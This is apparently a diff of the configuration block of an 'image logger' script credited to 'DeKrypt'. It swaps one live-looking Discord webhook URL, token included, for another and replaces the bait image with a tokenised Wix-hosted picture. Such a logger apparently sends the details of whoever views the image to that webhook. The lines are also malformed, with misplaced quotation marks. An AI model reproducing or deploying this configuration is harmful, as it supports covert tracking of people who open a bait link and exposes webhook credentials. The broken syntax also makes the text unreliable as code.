@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook":https://discord.com/api/webhooks/1109880981550284911/uAwMYSYT_MpGuDvc4LIFR4-BKDQsG9U5wPkwsUoVg2R66v2MLJ7KVpwZKisQiebmZ2Xs "",
-    "image":https://upload.wikimedia.org/wikipedia/commons/b/b1/Hot_dog_with_mustard.png" a URL argument
+    "webhook":https://discord.com/api/webhooks/1109886912417767554/NcrJF-97pXvN8WEpY5VEnq2wVEHMwS0ZTwyYKCMUfiw2kC5PfjWOJQnJ5BmQogUn2HyO "",
+    "image":https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/c82dd5b3-b0d8-44e8-b11d-a50e55b7b9de/df88x1u-11447c51-1026-4d83-8476-f996afc6356f.png?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7InBhdGgiOiJcL2ZcL2M4MmRkNWIzLWIwZDgtNDRlOC1iMTFkLWE1MGU1NWI3YjlkZVwvZGY4OHgxdS0xMTQ0N2M1MS0xMDI2LTRkODMtODQ3Ni1mOTk2YWZjNjM1NmYucG5nIn1dXSwiYXVkIjpbInVybjpzZXJ2aWNlOmZpbGUuZG93bmxvYWQiXX0.nWUGLLw1oz35sdgGgCUhQFbnjM_YFLXaYR_EN6rAZ3Q" a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
